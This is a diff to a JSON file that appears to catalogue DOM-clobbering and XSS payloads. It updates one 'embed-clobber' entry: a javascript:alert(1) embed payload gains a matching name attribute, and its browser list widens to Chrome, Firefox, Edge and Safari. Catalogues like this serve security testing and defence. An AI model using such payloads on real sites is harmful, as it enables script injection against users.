@@ -90,9 +90,9 @@
     "technique": "object-clobber"
   },
   {
-    "description": "DOM clobbering via embed element with name",
-    "code": "<embed id=\"embed\" src=\"javascript:alert(1)\">",
-    "browsers": ["ie", "edge"],
+    "description": "DOM clobbering via embed with matching id and name shadowing window.embed as a collection",
+    "code": "<embed id=\"embed\" name=\"embed\" src=\"javascript:alert(1)\">",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
     "technique": "embed-clobber"
   },
   {
